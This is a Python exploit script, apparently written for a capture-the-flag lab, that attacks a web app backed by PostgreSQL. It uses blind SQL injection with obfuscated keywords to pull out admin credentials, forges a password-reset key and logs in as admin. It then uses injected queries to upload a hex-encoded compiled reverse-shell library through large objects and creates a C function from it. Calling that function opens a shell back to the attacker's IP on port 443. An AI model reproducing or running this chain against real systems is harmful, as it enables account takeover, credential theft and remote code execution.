import requests
import sys
import re
import time
import concurrent.futures
from functools import partial
import hashlib
import base64

s = requests.Session()
ip = '10.129.204.251:8080'

def send_sqli_request(inj_str, j):

    target = "http://%s/api/v1/check-user" % (ip)
    params = {'u' : '%s' % (inj_str.replace("[CHAR]", str(j)))}
    r = requests.get(target, params=params)
    error = re.search("true", r.text)
    if error:
        return chr(j)
    return ""    

def inject(r, inj):
    extracted = ""
    for i in range(1, r):
        injection_string = "admin'/*A*/aNd/*A*/(asCii(subsTring((%s),%d,1)))=[CHAR]--rezur" % (inj,i)

        #multi: retrieved_value = send_sqli_request(ip,  injection_string)
        with concurrent.futures.ThreadPoolExecutor(max_workers=94) as executor: 
                threads = executor.map(partial(send_sqli_request, injection_string), list(range(32, 126)))
        retrieved_value = ""

        for extracted_char in threads:  # map method puts inject() results in a sequential order
                retrieved_value += extracted_char # into the threads list 
        
        if(retrieved_value):
            extracted += retrieved_value
            #extracted_char = chr(retrieved_value)
            #sys.stdout.write(extracted_char)
            sys.stdout.write(retrieved_value)
            sys.stdout.flush()
        else:
            print ("\n(+) done!")
            break
    return extracted

def generate_secret_key(email, password):
    email = email
    salt = '$4lty'
    password = password
    tmp = email + salt + password
    digest = hashlib.sha256(tmp.encode('utf-8')).digest()
    b64 = base64.urlsafe_b64encode(digest).decode('utf-8').replace("-", "X").replace("_", "X")
    secret_key = "{}-{}-{}-{}".format(b64[:4], b64[4:8], b64[8:12], b64[12:16])
    return str(secret_key)

def reset_password(key):
    target = "http://%s/reset-password" % (ip)
    data = {'username':'admin', 'resetKey':key, 'password':'admin', 'repeatPassword':'admin'}
    time.sleep(0.5)
    response = requests.post(target, data=data, allow_redirects=False)
    print('[*] Password Reset for admin' if 'Password+was+reset' in str(response.headers['Location']) else "[!] Failed")

def login_as_admin():
    target = "http://%s/login" % (ip)
    data = {'username':'admin', 'password':'admin'}
    time.sleep(0.5)
    response = s.post(target, data=data, allow_redirects=False)
    print('[*] Loggedin as admin' if 'Invalid+username+or+password' not in str(response.headers['Location']) else "[!] Failed")

def auth_sqli(query):
    target = "http://%s/dashboard/edit" % (ip)
    payload = '1337 union select 1,2,$$3$$,$$4$$,CAST(([QUERY]) AS VARCHAR)-- -'.replace("[QUERY]", query)
    data = {'title':'aaa', 'username':'aaa', 'password':'aaa','id':payload}
    time.sleep(0.5)
    response = s.post(target, data=data, allow_redirects=False)
    print('[*] Injection Successful: %s' % payload if 'Password+edited' in str(response.headers['Location']) else "[!] Injection Failed")

def auth_sqli_alternative(query):
    target = "http://%s/dashboard/edit" % (ip)
    payload = '1337; [QUERY]'.replace("[QUERY]", query)
    data = {'title':'aaa', 'username':'aaa', 'password':'aaa','id':payload}
    time.sleep(0.5)
    response = s.post(target, data=data, allow_redirects=False)
    print('[*] Injection Successful: %s' % payload) 

def main():

    #query = "SElECT/*A*/version()"
    #query = "SELeCT/*A*/STrING_AgG(table_name,',')/*A*/FRoM/*A*/information_schema.tables/*A*/whEre/*A*/table_schema='pass2'" #Do not have postgres role/permission
    query = "SELeCT/*A*/STrING_AgG(email,',')/*A*/FrOM/*A*/users/*A*/whEre/*A*/username='admin'"
    email = inject(150, query)
    query = "SELeCT/*A*/STrING_AgG(passwOrd,',')/*A*/FrOM/*A*/users/*A*/whEre/*A*/username='admin'"
    password = inject(150, query)
    key = generate_secret_key(str(email),str(password))
    print("The Secret-Key is: ",key) # 0NPd-748b-L2CD-MoR3
    reset_password(key)
    login_as_admin()
    query = "select lo_create(31337)"
    auth_sqli(query) # LO create
    query = "select lo_put(31337, 0, DECODE($$7f454c4602010100000000000000000003003e0001000000c010000000000000400000000000000078390000000000000000000040003800090040001c001b000100000004000000000000000000000000000000000000000000000000000000980600000000000098060000000000000010000000000000010000000500000000100000000000000010000000000000001000000000000075020000000000007502000000000000001000000000000001000000040000000020000000000000002000000000000000200000000000001c010000000000001c0100000000000000100000000000000100000006000000102e000000000000103e000000000000103e0000000000005002000000000000580200000000000000100000000000000200000006000000202e000000000000203e000000000000203e000000000000c001000000000000c0010000000000000800000000000000040000000400000038020000000000003802000000000000380200000000000024000000000000002400000000000000040000000000000050e57464040000002c200000000000002c200000000000002c2000000000000034000000000000003400000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000102e000000000000103e000000000000103e000000000000f001000000000000f0010000000000000100000000000000040000001400000003000000474e5500c909e92f7803b7a8b86524349bd1408e3b54cfe000000000030000000d000000010000000600000080a00100000280000d0000000e0000000f000000518323e7e9b3cd68c70da6d40000000000000000000000000000000000000000000000001000000020000000000000000000000000000000000000009e0000001200000000000000000000000000000000000000bd00000012000000000000000000000000000000000000007600000010000000000000000000000000000000000000008e0000001000000000000000000000000000000000000000c20000001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000a40000001200000000000000000000000000000000000000b500000012000000000000000000000000000000000000002c0000002000000000000000000000000000000000000000460000002200000000000000000000000000000000000000ae00000012000000000000000000000000000000000000006300000012000c0082110000000000000d000000000000006c00000012000c008f11000000000000dd000000000000005500000012000c0075110000000000000d00000000000000005f5f676d6f6e5f73746172745f5f005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a650050675f6d616769635f66756e630070675f66696e666f5f7265765f7368656c6c0070675f6465746f6173745f646174756d5f7061636b656400746578745f746f5f63737472696e670068746f6e7300696e65745f70746f6e00736f636b657400636f6e6e656374006475703200657865637665006c6962632e736f2e3600474c4942435f322e322e350000000000000200020000000000020000000200020000000200020001000100010001000100c90000001000000000000000751a690900000200d300000000000000103e00000000000008000000000000007011000000000000183e00000000000008000000000000003011000000000000584000000000000008000000000000005840000000000000e03f00000000000006000000010000000000000000000000e83f00000000000006000000070000000000000000000000f03f000000000000060000000a0000000000000000000000f83f000000000000060000000b00000000000000000000001840000000000000070000000200000000000000000000002040000000000000070000000300000000000000000000002840000000000000070000000400000000000000000000003040000000000000070000000500000000000000000000003840000000000000070000000600000000000000000000004040000000000000070000000800000000000000000000004840000000000000070000000900000000000000000000005040000000000000070000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004883ec08488b05dd2f00004885c07402ffd04883c408c3000000000000000000ff35e22f0000ff25e42f00000f1f4000ff25e22f00006800000000e9e0ffffffff25da2f00006801000000e9d0ffffffff25d22f00006802000000e9c0ffffffff25ca2f00006803000000e9b0ffffffff25c22f00006804000000e9a0ffffffff25ba2f00006805000000e990ffffffff25b22f00006806000000e980ffffffff25aa2f00006807000000e970ffffffff25422f000066900000000000000000488d3d992f0000488d05922f00004839f87415488b05062f00004885c07409ffe00f1f8000000000c30f1f8000000000488d3d692f0000488d35622f00004829fe4889f048c1ee3f48c1f8034801c648d1fe7414488b05d52e00004885c07408ffe0660f1f440000c30f1f8000000000803d292f000000752f5548833db62e0000004889e5740c488b3d0a2f0000e85dffffffe868ffffffc605012f0000015dc30f1f8000000000c30f1f8000000000e97bffffff554889e5488d05900e00005dc3554889e5488d059b0e00005dc3554889e54883ec4048897dc8488b45c8488b40204889c7e8a5feffff4889c7e8adfeffff488945f8488b45c8488b40308945f466c745d002008b45f40fb7c089c7e85bfeffff668945d2488d45d0488d5004488b45f84889c6bf02000000e88efeffffba00000000be01000000bf02000000e89afeffff8945f0488d4dd08b45f0ba100000004889ce89c7e871feffff8945ec8b45f0be0000000089c7e80ffeffff8b45f0be0100000089c7e800feffff8b45f0be0200000089c7e8f1fdffffba00000000be00000000488d3da00d0000e80bfeffffb800000000c9c34883ec084883c408c300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002f62696e2f736800000000000000000018000000140500006400000020000000400000000100000001000000011b033b3000000005000000f4efffff4c00000084f0ffff7400000049f1ffff8c00000056f1ffffac00000063f1ffffcc0000001400000000000000017a5200017810011b0c070890010000240000001c000000a0efffff90000000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000008f0ffff0800000000000000000000001c0000005c000000b5f0ffff0d00000000410e108602430d06480c07080000001c0000007c000000a2f0ffff0d00000000410e108602430d06480c07080000001c0000009c0000008ff0ffffdd00000000410e108602430d0602d80c070800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000701100000000000030110000000000000100000000000000c9000000000000000c0000000000000000100000000000000d000000000000006c120000000000001900000000000000103e0000000000001b0000000000000008000000000000001a00000000000000183e0000000000001c000000000000000800000000000000f5feff6f00000000600200000000000005000000000000001004000000000000060000000000000090020000000000000a00000000000000df000000000000000b000000000000001800000000000000030000000000000000400000000000000200000000000000c000000000000000140000000000000007000000000000001700000000000000d805000000000000070000000000000030050000000000000800000000000000a80000000000000009000000000000001800000000000000feffff6f000000001005000000000000ffffff6f000000000100000000000000f0ffff6f00000000f004000000000000f9ffff6f00000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000203e000000000000000000000000000000000000000000003610000000000000461000000000000056100000000000006610000000000000761000000000000086100000000000009610000000000000a61000000000000058400000000000004743433a202844656269616e2031302e322e312d36292031302e322e3120323032313031313000000000000000000000000000000000000000000000000000000000000003000100380200000000000000000000000000000000000003000200600200000000000000000000000000000000000003000300900200000000000000000000000000000000000003000400100400000000000000000000000000000000000003000500f00400000000000000000000000000000000000003000600100500000000000000000000000000000000000003000700300500000000000000000000000000000000000003000800d80500000000000000000000000000000000000003000900001000000000000000000000000000000000000003000a00201000000000000000000000000000000000000003000b00b01000000000000000000000000000000000000003000c00c01000000000000000000000000000000000000003000d006c1200000000000000000000000000000000000003000e00002000000000000000000000000000000000000003000f002c2000000000000000000000000000000000000003001000602000000000000000000000000000000000000003001100103e00000000000000000000000000000000000003001200183e00000000000000000000000000000000000003001300203e00000000000000000000000000000000000003001400e03f0000000000000000000000000000000000000300150000400000000000000000000000000000000000000300160058400000000000000000000000000000000000000300170060400000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000002000c00c01000000000000000000000000000000e00000002000c00f01000000000000000000000000000002100000002000c00301100000000000000000000000000003700000001001700604000000000000001000000000000004300000001001200183e00000000000000000000000000006a00000002000c00701100000000000000000000000000007600000001001100103e0000000000000000000000000000950000000400f1ff00000000000000000000000000000000a400000001000e0010200000000000001800000000000000b400000001000e0028200000000000000400000000000000010000000400f1ff00000000000000000000000000000000bf0000000100100018210000000000000000000000000000000000000400f1ff00000000000000000000000000000000cd00000002000d006c120000000000000000000000000000d30000000100160058400000000000000000000000000000e000000001001300203e0000000000000000000000000000e900000000000f002c200000000000000000000000000000fc00000001001600604000000000000000000000000000000801000001001500004000000000000000000000000000001e01000002000900001000000000000000000000000000002401000012000c0075110000000000000d00000000000000c401000012000c008f11000000000000dd000000000000003201000020000000000000000000000000000000000000004e0100001200000000000000000000000000000000000000600100001200000000000000000000000000000000000000710100001000000000000000000000000000000000000000890100001000000000000000000000000000000000000000990100001200000000000000000000000000000000000000ac0100002000000000000000000000000000000000000000bb01000012000c0082110000000000000d00000000000000ce0100001200000000000000000000000000000000000000e40100001200000000000000000000000000000000000000f801000020000000000000000000000000000000000000001202000022000000000000000000000000000000000000002d02000012000000000000000000000000000000000000000063727473747566662e6300646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e30005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e7472790070675f7265765f7368656c6c2e630050675f6d616769635f646174612e31006d795f66696e666f2e30005f5f4652414d455f454e445f5f005f66696e69005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f005f696e69740050675f6d616769635f66756e63005f49544d5f64657265676973746572544d436c6f6e655461626c650068746f6e7340474c4942435f322e322e35006475703240474c4942435f322e322e350070675f6465746f6173745f646174756d5f7061636b656400746578745f746f5f63737472696e670065786563766540474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f0070675f66696e666f5f7265765f7368656c6c00696e65745f70746f6e40474c4942435f322e322e3500636f6e6e65637440474c4942435f322e322e35005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a6540474c4942435f322e322e3500736f636b657440474c4942435f322e322e3500002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000000000003802000000000000380200000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000600200000000000060020000000000003000000000000000030000000000000008000000000000000000000000000000380000000b00000002000000000000009002000000000000900200000000000080010000000000000400000001000000080000000000000018000000000000004000000003000000020000000000000010040000000000001004000000000000df0000000000000000000000000000000100000000000000000000000000000048000000ffffff6f0200000000000000f004000000000000f004000000000000200000000000000003000000000000000200000000000000020000000000000055000000feffff6f02000000000000001005000000000000100500000000000020000000000000000400000001000000080000000000000000000000000000006400000004000000020000000000000030050000000000003005000000000000a8000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000d805000000000000d805000000000000c00000000000000003000000150000000800000000000000180000000000000078000000010000000600000000000000001000000000000000100000000000001700000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000002010000000000000201000000000000090000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000b010000000000000b010000000000000080000000000000000000000000000000800000000000000080000000000000087000000010000000600000000000000c010000000000000c010000000000000ac010000000000000000000000000000100000000000000000000000000000008d0000000100000006000000000000006c120000000000006c12000000000000090000000000000000000000000000000400000000000000000000000000000093000000010000000200000000000000002000000000000000200000000000002c000000000000000000000000000000100000000000000000000000000000009b0000000100000002000000000000002c200000000000002c200000000000003400000000000000000000000000000004000000000000000000000000000000a900000001000000020000000000000060200000000000006020000000000000bc00000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000103e000000000000102e0000000000000800000000000000000000000000000008000000000000000800000000000000bf0000000f0000000300000000000000183e000000000000182e0000000000000800000000000000000000000000000008000000000000000800000000000000cb000000060000000300000000000000203e000000000000202e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000e03f000000000000e02f0000000000002000000000000000000000000000000008000000000000000800000000000000d4000000010000000300000000000000004000000000000000300000000000005800000000000000000000000000000008000000000000000800000000000000dd000000010000000300000000000000584000000000000058300000000000000800000000000000000000000000000008000000000000000000000000000000e3000000080000000300000000000000604000000000000060300000000000000800000000000000000000000000000001000000000000000000000000000000e80000000100000030000000000000000000000000000000603000000000000027000000000000000000000000000000010000000000000001000000000000000100000002000000000000000000000000000000000000008830000000000000b8050000000000001a0000002e00000008000000000000001800000000000000090000000300000000000000000000000000000000000000403600000000000040020000000000000000000000000000010000000000000000000000000000001100000003000000000000000000000000000000000000008038000000000000f100000000000000000000000000000001000000000000000000000000000000$$,$$HEX$$))"
    auth_sqli(query) # postgres extension .so uploaded to LO
    query = "select lo_export(31337, $$/tmp/rezur.so$$)"
    auth_sqli(query) # postgres extension exported to server
    query = "select lo_unlink(31337)"
    auth_sqli(query) # LO remove
    query = "CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS integer AS $$/tmp/rezur$$, $$rev_shell$$ LANGUAGE C STRICT"
    auth_sqli_alternative(query) # create function
    query = "SELECT rev_shell($$10.10.14.255$$, 443)"
    auth_sqli_alternative(query) # calling function


if __name__ == "__main__":
    main()